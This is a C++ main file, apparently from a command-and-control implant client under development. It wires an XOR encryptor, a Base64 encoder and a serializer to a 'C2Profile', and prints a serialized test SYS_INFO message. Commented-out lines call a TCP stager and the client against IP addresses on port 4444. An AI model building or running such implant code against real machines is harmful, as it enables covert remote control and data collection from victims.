#include "Client.h"
#include <iostream>

int main()
{
	//Config config = loadConfig();
    //Client client(config);
    //tcpStager.run("172.18.245.234", "4444");
    //tcpStager.run("10.0.0.86", "4444");
	//Client client;
	//
	//Compressor compressor; 
	XorEncryptor encryptor; 
	B64Encoder encoder;
	BinarySerializer serializer; 
	C2Profile config;

    //Client client(compressor, encryptor, encoder, serializer, config);
    Client client(encryptor, encoder, serializer, config);

	InternalMessage msg;
	MessageHeader header;
	header.messageType = MessageType::SYS_INFO;
	header.dataSize = 32;
	header.messageId = 99;
	msg.data = {
			0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
			0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
			0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 
			0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F};
	msg.header = header;

	std::vector<uint8_t> outMsg;

	serializer.serialize(msg, outMsg);

	for (auto b : outMsg)
	{
		std::cout << static_cast<int>(b) << " ";
	}
	std::cout << std::endl;


    //const char server_ip[] = "127.0.0.1";
    //client.run(server_ip, "4444"); // TODO: add/replace with C2Profile Config param?

	/* MainLoop: 
	 * - setup socket
	 * - connect to server
	 * - client main loop
	 * - close connection
	 * */
    return 0;
}
